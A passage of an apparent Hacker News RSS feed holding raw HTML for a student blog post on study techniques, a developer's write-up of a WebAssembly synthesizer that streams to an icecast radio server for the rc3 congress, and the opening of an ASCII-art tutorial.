<div data-carousel-extra="{&quot;blog_id&quot;:1,&quot;permalink&quot;:&quot;http:\/\/studyhealthy.org\/the-most-effective-ways-to-study-according-to-science\/admin\/&quot;}"><figure><img data-attachment-id="576" data-permalink="http://studyhealthy.org/the-most-effective-ways-to-study-according-to-science/admin/www-studyhealthy-org-2/" data-orig-file="https://i0.wp.com/studyhealthy.org/wp-content/uploads/2018/12/www.StudyHealthy.org_-1.png?fit=735%2C1102" data-orig-size="735,1102" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="www.StudyHealthy.org" data-image-description="" data-medium-file="https://i0.wp.com/studyhealthy.org/wp-content/uploads/2018/12/www.StudyHealthy.org_-1.png?fit=200%2C300" data-large-file="https://i0.wp.com/studyhealthy.org/wp-content/uploads/2018/12/www.StudyHealthy.org_-1.png?fit=683%2C1024" loading="lazy" width="735" height="1102" src="https://i0.wp.com/studyhealthy.org/wp-content/uploads/2018/12/www.StudyHealthy.org_-1.png?fit=683%2C1024" alt="" srcset="https://i0.wp.com/studyhealthy.org/wp-content/uploads/2018/12/www.StudyHealthy.org_-1.png?w=735 735w, https://i0.wp.com/studyhealthy.org/wp-content/uploads/2018/12/www.StudyHealthy.org_-1.png?resize=200%2C300 200w, https://i0.wp.com/studyhealthy.org/wp-content/uploads/2018/12/www.StudyHealthy.org_-1.png?resize=683%2C1024 683w" sizes="(max-width: 735px) 100vw, 735px" data-lazy-srcset="https://i0.wp.com/studyhealthy.org/wp-content/uploads/2018/12/www.StudyHealthy.org_-1.png?w=735 735w, https://i0.wp.com/studyhealthy.org/wp-content/uploads/2018/12/www.StudyHealthy.org_-1.png?resize=200%2C300 200w, https://i0.wp.com/studyhealthy.org/wp-content/uploads/2018/12/www.StudyHealthy.org_-1.png?resize=683%2C1024 683w" data-lazy-src="https://i0.wp.com/studyhealthy.org/wp-content/uploads/2018/12/www.StudyHealthy.org_-1.png?fit=683%2C1024&amp;is-pending-load=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<h6><strong><em>No. 1</em></strong></h6>



<h6><strong>Don’t</strong> cram the night before and/or try to pull of an all nighter</h6>



<p>I know you don’t want to hear it, but cramming is not effective at all. You tend to only remember the information you have learned on the beginning and the end of your entire study session. You will most likely have a problem with recalling the information you’ve tried to learn in the middle. In case you do have to cram a lot of information at once, try to study the most important information at the beginning and at the end. But you do have to have some kind of information in the middle, you can’t just learn “the end and the beginning”.</p>



<p>Also, you will not be able to recall almost any of the information, in less than five days. Our brain will not consider it important enough to store it into your long-term memory. I’ll get to that later in this article.</p>



<h6><em><strong>No. 2</strong></em></h6>



<h6>Hilighting will <strong>not</strong> do the trick</h6>



<p>A commonly used study technique is using highlighters. This does not come in handy if you are trying to remember something, especially, if you end up highlighting the entire textbook like a coloring book. Yes, this may help you, during making a structural list of topics or important vocabulary for the topic. You won’t actually learn anything, just by adding color. This may serve as a guideline within the text itself (e. g. where can you find information, once you really start studying)</p>



<h6><strong><em>No. 3</em></strong></h6>



<h6>Space it out!</h6>



<p>Most students hate this advice, <g id="8" data-gr-id="8">me</g> included, but it really does work. If you space out the amount of information, within a longer period of time, you will be more effective. To understand the real reason behind this, we have to understand the psychology behind our memory.</p>



<p>Our brain can’t remember everything. That’s why we remember only things that are important for some reason. Of course, that huge amounts of information you are supposed to remember for a test will most likely not be so interesting&nbsp;for you to remember everything about it. So, to get your brain to consider it as important you have to slightly “cheat” the brain.</p>



<p>And, how do we do that? By taking the information and studying it over and over, which I know sounds ridiculous, you will get to the point, where your brain “thinks” that since you’ve been recapping it so many times, the information must be important for some reason. Because of this, you are much more likely to remember things <g id="315" data-gr-id="315">you’ve</g> done many times in the past.</p>



<p>More on how to study for big exams in advance <a href="http://studyhealthy.org/guide-to-successful-final-exams/admin/">HERE</a>.</p>



<div data-carousel-extra="{&quot;blog_id&quot;:1,&quot;permalink&quot;:&quot;http:\/\/studyhealthy.org\/the-most-effective-ways-to-study-according-to-science\/admin\/&quot;}"><figure><img loading="lazy" src="https://i1.wp.com/studyhealthy.org/wp-content/uploads/2019/03/Kopie-n%C3%A1vrhu-HOW-TO-PREPARE-FOR-A-EXAM.png?fit=410%2C1024" alt="" width="582" height="1455" srcset="https://i0.wp.com/studyhealthy.org/wp-content/uploads/2019/03/Kopie-n%C3%A1vrhu-HOW-TO-PREPARE-FOR-A-EXAM.png?w=800 800w, https://i0.wp.com/studyhealthy.org/wp-content/uploads/2019/03/Kopie-n%C3%A1vrhu-HOW-TO-PREPARE-FOR-A-EXAM.png?resize=120%2C300 120w, https://i0.wp.com/studyhealthy.org/wp-content/uploads/2019/03/Kopie-n%C3%A1vrhu-HOW-TO-PREPARE-FOR-A-EXAM.png?resize=768%2C1920 768w, https://i0.wp.com/studyhealthy.org/wp-content/uploads/2019/03/Kopie-n%C3%A1vrhu-HOW-TO-PREPARE-FOR-A-EXAM.png?resize=410%2C1024 410w" sizes="(max-width: 582px) 100vw, 582px" data-lazy-srcset="https://i0.wp.com/studyhealthy.org/wp-content/uploads/2019/03/Kopie-návrhu-HOW-TO-PREPARE-FOR-A-EXAM.png?w=800 800w, https://i0.wp.com/studyhealthy.org/wp-content/uploads/2019/03/Kopie-návrhu-HOW-TO-PREPARE-FOR-A-EXAM.png?resize=120%2C300 120w, https://i0.wp.com/studyhealthy.org/wp-content/uploads/2019/03/Kopie-návrhu-HOW-TO-PREPARE-FOR-A-EXAM.png?resize=768%2C1920 768w, https://i0.wp.com/studyhealthy.org/wp-content/uploads/2019/03/Kopie-návrhu-HOW-TO-PREPARE-FOR-A-EXAM.png?resize=410%2C1024 410w" data-lazy-src="https://i1.wp.com/studyhealthy.org/wp-content/uploads/2019/03/Kopie-návrhu-HOW-TO-PREPARE-FOR-A-EXAM.png?fit=410%2C1024&amp;is-pending-load=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<ul data-carousel-extra="{&quot;blog_id&quot;:1,&quot;permalink&quot;:&quot;http:\/\/studyhealthy.org\/the-most-effective-ways-to-study-according-to-science\/admin\/&quot;}"></ul>



<h6><strong><em>No. 4</em></strong></h6>



<h6>Look at some study materials ahead of time</h6>



<p>By doing so, you will have a rough guidline. Some high schools make you do worksheets, where you write information from your textbooks down, or some teachers may just advise you to read it. Because of doing this, you will know the structure, and fewer things will surprise you. And if there is some vocabulary you don’t fully understand, you can just look it up. Even just actively reading through it will get you to think about it and sort the information logically in your memory.</p>



<h6><strong><em>No. 5 </em></strong></h6>



<h6>Look at your notes within a few hours after writing them</h6>



<p>By reviewing the notes from class every evening you will achieve a very important effect on you learning the information. According to many <g id="9" data-gr-id="9">researches</g> and studies <g id="10" data-gr-id="10">done</g> in the past few years, we forget about 50 to 75% of learned information learned only 24 hours before. In other words, most people will be able to recall only about 25 to 35 % of information learned only 24 hours ago. The 24 hours are crucial. </p>



<p>Most studies have found, that we can recall most information within 1 to 2 hours after learning it. To stop, or at least slow down the process of forgetting all of it, all you have to <g id="7" data-gr-id="7">do,</g> is to look at your notes and quickly go through them. This way, you still remember things from class and you connect it to your notes.</p>



<div data-carousel-extra="{&quot;blog_id&quot;:1,&quot;permalink&quot;:&quot;http:\/\/studyhealthy.org\/the-most-effective-ways-to-study-according-to-science\/admin\/&quot;}"><figure><img data-attachment-id="579" data-permalink="http://studyhealthy.org/the-most-effective-ways-to-study-according-to-science/admin/www-studyhealthy-org%2fsmall/" data-orig-file="https://i1.wp.com/studyhealthy.org/wp-content/uploads/2018/12/www.StudyHealthy.org2Fsmall.png?fit=800%2C800" data-orig-size="800,800" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="www.StudyHealthy.org%2Fsmall" data-image-description="" data-medium-file="https://i1.wp.com/studyhealthy.org/wp-content/uploads/2018/12/www.StudyHealthy.org2Fsmall.png?fit=300%2C300" data-large-file="https://i1.wp.com/studyhealthy.org/wp-content/uploads/2018/12/www.StudyHealthy.org2Fsmall.png?fit=800%2C800" loading="lazy" width="800" height="800" src="https://i1.wp.com/studyhealthy.org/wp-content/uploads/2018/12/www.StudyHealthy.org2Fsmall.png?resize=800%2C800" alt="" srcset="https://i1.wp.com/studyhealthy.org/wp-content/uploads/2018/12/www.StudyHealthy.org2Fsmall.png?w=800 800w, https://i1.wp.com/studyhealthy.org/wp-content/uploads/2018/12/www.StudyHealthy.org2Fsmall.png?resize=150%2C150 150w, https://i1.wp.com/studyhealthy.org/wp-content/uploads/2018/12/www.StudyHealthy.org2Fsmall.png?resize=300%2C300 300w, https://i1.wp.com/studyhealthy.org/wp-content/uploads/2018/12/www.StudyHealthy.org2Fsmall.png?resize=768%2C768 768w, https://i1.wp.com/studyhealthy.org/wp-content/uploads/2018/12/www.StudyHealthy.org2Fsmall.png?resize=75%2C75 75w" sizes="(max-width: 800px) 100vw, 800px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/studyhealthy.org/wp-content/uploads/2018/12/www.StudyHealthy.org2Fsmall.png?w=800 800w, https://i1.wp.com/studyhealthy.org/wp-content/uploads/2018/12/www.StudyHealthy.org2Fsmall.png?resize=150%2C150 150w, https://i1.wp.com/studyhealthy.org/wp-content/uploads/2018/12/www.StudyHealthy.org2Fsmall.png?resize=300%2C300 300w, https://i1.wp.com/studyhealthy.org/wp-content/uploads/2018/12/www.StudyHealthy.org2Fsmall.png?resize=768%2C768 768w, https://i1.wp.com/studyhealthy.org/wp-content/uploads/2018/12/www.StudyHealthy.org2Fsmall.png?resize=75%2C75 75w" data-lazy-src="https://i1.wp.com/studyhealthy.org/wp-content/uploads/2018/12/www.StudyHealthy.org2Fsmall.png?resize=800%2C800&amp;is-pending-load=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<h6><em><strong>No.&nbsp;6</strong></em></h6>



<h6> Retrieval Practice </h6>



<p>By simply reading your notes over and over for two hours, your effectivity of learning is on its minimum. The way to make all of this more effective, and spend much less time doing something so ineffective, is to simply write it down. You call also find practice test online or use apps such as <a href="https://quizlet.com/">Quizlet</a>.&nbsp;By doing so, you have to reach into your memory to find the information needed. By reading your notes over and over you will never achieve that, since the information is simply still right in front of you, so, technically, there is no good reason for you to even try to engage your brain and recall the information at all. </p>



<h6><strong><em>No. 7</em></strong></h6>



<h6>Have an intention with your knowledge </h6>



<p>By learning something “just cause” is usually not enough. You need to have a good reason to remember the information that’s put in front of you.</p>



<p>In a pretty recent study <em>(2014) </em>conducted by John Nestojko called <em>Expecting to teach enhances learning and organization of knowledge in free recall of text passages,</em> it has been shown that by telling students they will have to teach the topic, later on, has completely changed their mindset. They understood the topic better and were able to engage in a more effective way in comparison to the group which only expected a test on the end of the chapter.</p>



<h6><strong><em>No. 8</em></strong></h6>



<h6>Exercise before a study session</h6>



<p>Working out before a study session has shown being more alert, awake and active during studying. Even after a short workout, your brain is getting more oxygen, and your entire body is in an “active state”, your blood is pumping faster through your body and you <g id="133" data-gr-id="133">is</g> more alert. You are more awake and ready to do something active.</p>



<h6><em><strong>No.&nbsp;9</strong></em></h6>



<h6>Find conections</h6>



<p>It has been scientifically proven, that knowing and if you can, finding connections by yourself, is one of the most effective ways to memorize even a lot of information. This happens, because it is generally easier to remember a process or even order rather than a long list of information. By finding the connections you will find that the topic and all of the terms are somehow connected and most likely even make sense to why they are the way they are.</p>



<p>A good “extra tip” to this might be to find as many conections by yourself or with the help of a friend, but activley paticipate in the process of figuring it out. This will help you to remember it, since we, as humans have a tendency to remember thing we did on our own better than other things, we didn’t take a part in.</p>







<p>I hope some fo those scientifically proven techniques are going to work for you, good luck with studying!</p>



<figure><img data-attachment-id="392" data-permalink="http://studyhealthy.org/is-it-possible-to-find-a-balance-between-studying-and-being-healthy/admin/navrh-bez-nazvu-2/" data-orig-file="https://i2.wp.com/studyhealthy.org/wp-content/uploads/2018/10/Návrh-bez-názvu-1.png?fit=575%2C221" data-orig-size="575,221" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Lea’s signature" data-image-description="" data-medium-file="https://i2.wp.com/studyhealthy.org/wp-content/uploads/2018/10/Návrh-bez-názvu-1.png?fit=300%2C115" data-large-file="https://i2.wp.com/studyhealthy.org/wp-content/uploads/2018/10/Návrh-bez-názvu-1.png?fit=575%2C221" loading="lazy" src="https://i2.wp.com/studyhealthy.org/wp-content/uploads/2018/10/N%C3%A1vrh-bez-n%C3%A1zvu-1.png?resize=377%2C145" alt="" width="377" height="145" srcset="https://i2.wp.com/studyhealthy.org/wp-content/uploads/2018/10/N%C3%A1vrh-bez-n%C3%A1zvu-1.png?w=575 575w, https://i2.wp.com/studyhealthy.org/wp-content/uploads/2018/10/N%C3%A1vrh-bez-n%C3%A1zvu-1.png?resize=300%2C115 300w" sizes="(max-width: 377px) 100vw, 377px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/studyhealthy.org/wp-content/uploads/2018/10/Návrh-bez-názvu-1.png?w=575 575w, https://i2.wp.com/studyhealthy.org/wp-content/uploads/2018/10/Návrh-bez-názvu-1.png?resize=300%2C115 300w" data-lazy-src="https://i2.wp.com/studyhealthy.org/wp-content/uploads/2018/10/Návrh-bez-názvu-1.png?resize=377%2C145&amp;is-pending-load=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<h6>P. S. Happy Holidays to You all!</h6>



<p><a href="http://www.pinterest.com/pin/create/button/" data-pin-do="buttonBookmark" data-pin-color="red" data-pin-height="128"><img src="https://i2.wp.com/assets.pinterest.com/images/pidgets/pinit_fg_en_rect_red_28.png?w=960" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/assets.pinterest.com/images/pidgets/pinit_fg_en_rect_red_28.png?w=960&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></p>
	</div></div>]]>
            </description>
            <link>http://studyhealthy.org/the-most-effective-ways-to-study-according-to-science/admin/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25569168</guid>
            <pubDate>Tue, 29 Dec 2020 12:40:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Getting Started in BBC Basic]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25569146">thread link</a>) | @ingve
<br/>
December 29, 2020 | https://www.bbcmicrobot.com/learn/index.html | <a href="https://web.archive.org/web/*/https://www.bbcmicrobot.com/learn/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.bbcmicrobot.com/learn/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25569146</guid>
            <pubDate>Tue, 29 Dec 2020 12:36:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: I built a virtual concert venue for artists]]>
            </title>
            <description>
<![CDATA[
Score 20 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25569112">thread link</a>) | @timdaub
<br/>
December 29, 2020 | https://timdaub.github.io/2020/12/27/wasm-stream/ | <a href="https://web.archive.org/web/*/https://timdaub.github.io/2020/12/27/wasm-stream/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p><strong>TL;DR:</strong> I built a <a target="_blank" rel="noopener" href="https://audio.daubenschuetz.de/assets/">synthesizer</a> that allows streaming directly to an <a target="_blank" rel="noopener" href="https://audio.daubenschuetz.de/">internet radio stream</a>. Below is the live stream:</p>
<p><audio controls="" autoplay="" preload="auto">
<source src="https://audio.daubenschuetz.de/stream.ogg" type="audio/ogg">
<source src="https://audio.daubenschuetz.de/stream" type="audio/mpeg">
<p>Your browser does not support the audio element. </p></audio></p>
<hr>
<p>It's that time between Christmas and new year again, where you can usually find me at Leipzig's Congress Zentrum on my computer hacking away. It's chaos congress time. Given this year's pandemic, the "37c3" however, was moved to the internet and renamed to <a target="_blank" rel="noopener" href="https://rc3.world/">"rc3", the Remote Chaos Communication Congress</a>.</p>
<p>Earlier this month, the iconic congress build-up started. This time around, building up didn't involve moving heavy crates of mate tea around. Instead, it meant that everyone started designing, drawing, and building their assembly maps for the "rc3.world". A <a target="_blank" rel="noopener" href="https://events.ccc.de/2020/09/04/rc3-remote-chaos-experience/">2D virtual space</a> that's supposed to replace this year's lack of physical space.</p>
<p>The rc3.world software is a fork of <a target="_blank" rel="noopener" href="https://workadventu.re/">workadventu.re</a>, a 2D game simulating a virtual work environment with avatars. Within this 2D map of the virtual congress, the organizers invited all assemblies to build their own spaces. And so, as the build-up for <a target="_blank" rel="noopener" href="https://www.dist0rtion.com/">Social Dist0rtion Protocol</a> assembly began, I had an idea for a project.</p>
<figure>
<img src="https://timdaub.github.io/assets/images/wasm-synth-screenshot.png" alt=""><figcaption><a target="_blank" rel="noopener" href="https://audio.daubenschuetz.de/assets/">wasm-synth</a>, the project I launched at last year's c3</figcaption>
</figure>
<p>At last year's congress in Leipzig, I had launched <a target="_blank" rel="noopener" href="https://audio.daubenschuetz.de/assets/">wasm-synth</a>, a synthesizer built in WebAssembly. Naturally, this time I was eager to take the project to the next stage. Hence, roughly a week ago, I started to work on a new project called "WASM-STREAM" - an extension to wasm-synth.</p>
<p><a target="_blank" rel="noopener" href="https://github.com/social-dist0rtion-protocol/wasm-stream">WASM-STREAM</a> is a virtual stage for digital artists. Using WASM-STREAM, an artist can broadcast their play with wasm-synth to an internet radio stream. More importantly, though, this means that they can take the stage on the <a target="_blank" rel="noopener" href="https://www.dist0rtion.com/">Social Dist0rtion Protocol</a>'s assembly and jam away to a virtually present audience.</p>
<figure>
<img src="https://timdaub.github.io/assets/images/wasm-stream.png" alt=""><figcaption>Social Dist0rtion Protocol's dance floor in the rc3.world</figcaption>
</figure>
<p>So how did I build it?</p>
<h2 id="a-first-little-demo">A First Little Demo</h2>
<p><a target="_blank" rel="noopener" href="https://audio.daubenschuetz.de/assets/">wasm-synth</a> is a project that I built deliberately to showcase the power of the web. At the beginning of the year, I wrote <a href="https://timdaub.github.io/2020/02/19/wasm-synth/">a blog post</a> outlining its technical details. It's using the <code>AudioWorklet</code> and some WebAssembly-transpiled code to render audio in real-time in the user's browser.</p>
<p>Now, workadventure, the software ccc uses to run their rc3.world, is also built on the web and allows embedding audio streams. So I thought, why not take the audio generated in wasm-synth and stream it to everyone in the rc3 world.</p>
<p>In a way, it sounds like not that big of a deal to build an audio streaming client within a website. But remember that a browser's networking ability is limited. While we've come a long way from the <code>XMLRequest</code> API to <code>fetch</code>, <code>WebSocket</code> and <code>WebRTC</code>, these concepts only allow talking upstream if their authors deliberately built their upstream application for supporting them.</p>
<p>Naive as I Am, I started by deploying <a target="_blank" rel="noopener" href="https://icecast.org/">icecast2</a> to a small Hetzner instance. I configured an authorized mount point that allows a streamer to connect using client software. Then I looked for a way to stream audio directly to icecast from a browser. And found... nothing.</p>
<p>Well, I did find something. It's called <a target="_blank" rel="noopener" href="https://webcast.github.io/">webcast</a>, and it's a <a target="_blank" rel="noopener" href="https://github.com/webcast/webcast.js/blob/master/SPECS.md">WebSocket-based subprotocol</a> that allows sending binary audio data between a client and a server. In their <a target="_blank" rel="noopener" href="https://github.com/webcast/webcast.js#server">README.md</a>, the authors also mention webcast's compatibility with <a target="_blank" rel="noopener" href="https://www.liquidsoap.info/">liquidsoap</a>, a DSL for audio stream processing.</p>
<p>So my first attempt at plugging these things together involved encoding the <code>Float32Array</code> data from the <code>AudioWorklet</code> into an mp3 stream using <a target="_blank" rel="noopener" href="https://github.com/toots/shine/">libshine</a> (that has a wasm JavaScript package) and then sending it to a <a target="_blank" rel="noopener" href="https://www.liquidsoap.info/doc-dev/harbor.html">liquidsoap "harbor"</a> via webcast. Liqidsoap would then convert the mp3 stream to ogg-vorbis, make it stereo, and forward it to the icecast server.</p>
<p>And, to my surprise, it worked. When I hit some keys on the wasm-synth, they got encoded and sent to the audio stream. With a bit of delay, I heard what I had just played. Cool!</p>
<p>Anyways, with my small little demo, I was galvanized and motivated enough to spend more time building something that would work for the congress.</p>
<h2 id="the-wasm-stream-architecture">The WASM-STREAM Architecture</h2>
<p>Ultimately, liquidsoap was not well-suited for my purpose. I also quickly realized that all I had to do was build a proxy between the <a target="_blank" rel="noopener" href="https://gist.github.com/ePirat/adc3b8ba00d85b7e3870">icecast protocol</a> and the <a target="_blank" rel="noopener" href="https://github.com/webcast/webcast.js/blob/master/SPECS.md">webcast protocol</a>. And that's what I ended up building. A small <a target="_blank" rel="noopener" href="https://github.com/webcast/webcast.js/blob/master/SPECS.md">JavaScript application</a> implementing two protocols. It listens for incoming WebSocket connections and calls icecast with a loooooonng PUT request to establish a stream.</p>
<p>WASM-STREAM itself doesn't do any encoding. It can, however, route an <code>audio/ogg</code> or an <code>audio/mpeg</code> stream from webcast to icecast. The encoding from WAV to mp3 takes place on the user's device already when the play the synthesizer.</p>
<h2 id="how-to-use-wasm-stream">How To Use WASM-STREAM</h2>
<p>Whether you have a ticket to rc3 or not, you can tune into the stream at <a target="_blank" rel="noopener" href="https://audio.daubenschuetz.de/stream">https://audio.daubenschuetz.de/stream</a>. It's an mp3-encoded stream, meaning it won't work in all browsers equally (Firefox works natively; Chrome et al. only support ogg/vorbis natively). If it doesn't, try a desktop application like iTunes or VLC.</p>
<p>The stream is continuously online. But if you don't hear anything then that's because nobody is currently playing the <a target="_blank" rel="noopener" href="https://audio.daubenschuetz.de/assets/">WASM-SYNTH</a>.</p>
<p>Finally, you're able to "dance" on the Social Dist0rtion Protocol's assembly dance floor. The rc3 orga was nice enough to allow us streaming audio on our map. <a target="_blank" rel="noopener" href="https://rc3.world/rc3/room/93840a8f-88f7-4f11-bb61-68800c4d4962/">Click here</a> to visit us directly on the rc3.world map.</p>

  </div></div>]]>
            </description>
            <link>https://timdaub.github.io/2020/12/27/wasm-stream/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25569112</guid>
            <pubDate>Tue, 29 Dec 2020 12:31:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Generative Grammar for Jazz Chord Sequences (1984)]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25569056">thread link</a>) | @wcerfgba
<br/>
December 29, 2020 | https://sci-hub.tf/https://www.jstor.org/stable/40285282 | <a href="https://web.archive.org/web/*/https://sci-hub.tf/https://www.jstor.org/stable/40285282">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://sci-hub.tf/https://www.jstor.org/stable/40285282</link>
            <guid isPermaLink="false">hacker-news-small-sites-25569056</guid>
            <pubDate>Tue, 29 Dec 2020 12:21:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hayley Wakenshaw's ASCII art tutorial]]>
            </title>
            <description>
<![CDATA[
Score 17 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25568945">thread link</a>) | @ducaale
<br/>
December 29, 2020 | https://www.ludd.ltu.se/~vk/pics/ascii/junkyard/techstuff/tutorials/Hayley_Wakenshaw.html | <a href="https://web.archive.org/web/*/https://www.ludd.ltu.se/~vk/pics/ascii/junkyard/techstuff/tutorials/Hayley_Wakenshaw.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><i>This tutorial is written by <a href="http://www.xs4all.nl/~klr/">Hayley Wakenshaw</a></i></p>
<hr>


<h2>Getting Started</h2>

<p>If you want to make ascii art the first thing you should know is that
you don't need a special program, or special skills to make it
with. All you need is somewhere to type text into - your e-mail
program, notepad, wordpad, that sort of thing - and an idea of what
you want to draw. There are no secrets or rules other than the
following:

</p><ol>
  <li> Use a non-proportional or fixed width font. Click <a href="http://www.xs4all.nl/~klr/fonts.html">HERE</a> for a
          page on this site that will tell you what they are, or ask
          me for the text version of the page via e-mail.

  </li><li> Don't use tabs!! Always, but always use the space bar (or your
 cursor keys/mouse if the program you're typing in supports that) for
 empty spaces. The reason for this is that different computers and
 programs interperet the size of a tab space differently, so although
 what you see on your screen looks fine, on someone else's your pic
 may look all split up.

 </li><li> Only use the keyboard characters on an American standard
 keyboard. That means all the letters, numbers and punctuation that
 you can see printed on the keyboard keys. You can use the shift key,
 but don't use the alt key to make characters. The reason for this is
 similar to that for not using tabs - different computers interperet
 alternative characters in different ways. The idea behind ascii is
 that all computers can read it because it's made up of characters
 that all computers will recognise.

 </li><li> Don't leave empty spaces at the end of each line. Make sure every
 line that you type ends on the last character, and not a few spaces
 after it. This can cause problems on other systems, with line
 wrapping and so on.
</li></ol>

<h2>Your First Ascii</h2>

<p>The best way to make a start is to take someone else's picture and see
if you can copy it. That way you get a feel for how you can use
different characters. We'll start easy. Try copying these shapes,
which only use the characters:

</p><pre> / \  |  _ 
 ___               ___
|   |      /\     /   \
|___|     /__\    \___/
</pre>

<p>Easy huh? Now try making the same shapes again using the characters: 

</p><pre>-  "  .  ,  `  :  &gt;  &lt;
</pre>

<p>This is what I came up with: 

</p><pre> .---.       .        .--.
 :   :     .' `.     &lt;    &gt;
 "---"     "---"      `--'
</pre>

<p>Bit more tricky, and it doesn't look as neat, but some of these
characters, and knowing how you can use them can come in very handy at
times, which we'll see later. Have a go at copying these, just for
practice. Change them if you like:
</p><pre> _   _    __    _   _                                   .^._    __
| |_| |_.'  `._| |_| |    /\  /\  /\  /\       /\      /   \|   \ \
|  _   _      _   _  |   /  \/  \/  \/  \    .'  `.   /_____V   / /
|_| |_| `.__.' |_| |_|  / /\  /\  /\  /\ \  &lt;      &gt;  |[]_[]|   \ \
                        \/  \/  \/  \/  \/   `.  .'   | |+| |   / /
                                               \/     `"""""'   \_\</pre>

<h2>Curves</h2>

<p>It's handy to know where the characters 'sit' on each line. Are they
at the top, in the middle or on the bottom of the line? A couple of
ascii characters vary in their position from computer to computer, but
mostly they all sit in the same place. Have a go yourself on your
keyboard. Here are some examples.

</p><pre>Top of line:            " ` '
Top or middle of line:  ^ * ~ =
Middle of line:         - +
Bottom of line:         _ . ,
</pre>

<p>You can use all these characters on one line to make a pattern, like
these:

</p><pre>_.,-=~+"^'`*`'^"+~=-,._.,-=~+"^'`*`'^"+~=-,._.,-=~+"^'`*`'^"+~=-,._


"^`'*-=~+,._.,+~=-*'`^"^`'*-=~+,._.,+~=-*'`^"^`'*-=~+,._.,+~=-*'`^"
</pre>
<p>Now try making a simple sig with a decorative border, using all the
characters we've met so far. This is what I came up with:
</p><pre>                        _________________________
  ..,,++~~--==**''``^^""  Hayley Jane wakenshaw  ""^^``''**==--~~++,,..
 /|\                     flump@quadrant.xs4all.nl                    /|\
&lt; : &gt; Flump's Fantastic Ascii Collection  http://www.xs4all.nl/~klr &lt; : &gt;
 \|/ "Daddy.. why doesn't the magnet pick up your floppy disks?..."  \|/
  ""^^''``**--==~~++,,.._________________________..,,++~~==--**``''^^""
</pre>

<h2>Using The Other Characters</h2>

<p>The other ascii characters fall into three categories. Either they're
the full height of the line or they're half height. Capitals and
numbers are always full height. Compare them to some of the others -
which are half height, and which are full height? Some examples:

</p><pre>Full height: A 7 % @ ! # ) ; &amp; $ ] } | / &gt; l t f k h d ?
Half height: a o v z
</pre>

<p>And then there's the 3rd sort. The characters that look like half
height, but sit a little lower on the line, like they would in
handwriting. These are: j g y p q

</p><p>And all together they can make a slight curve, just like the others:
</p><pre>pqyjgacoevA8!@)lf$%;$fl(@!8AveocagjypqacoevA8!@)lf$%;$fl(@!8Aveoc
</pre>

<h2>Lines and Diagonals</h2>

<p>There are three basic lines to any picture - straight (either
horizontally, or vertically), diagonal, and the third is the curve,
which includes circles. We'll look at straight and diagonal lines
first. Horizontal and vertical lines are simple in ascii - here are
some examples:
</p><pre>Horizontal: 8888888888888888888888888888888888888888888888888888888888
            """"""""""""""""""""""""""""""""""""""""""""""""""""""""""
            ----------------------------------------------------------
            __________________________________________________________
            ..........................................................


Vertical:   |    8    :    !    1    I
            |    8    :    !    1    I
            |    8    :    !    1    I
            |    8    :    !    1    I
            |    8    :    !    1    I
            |    8    :    !    1    I
</pre>
<p>Diagonals are a bit more tricky. You can make simple ones using the /
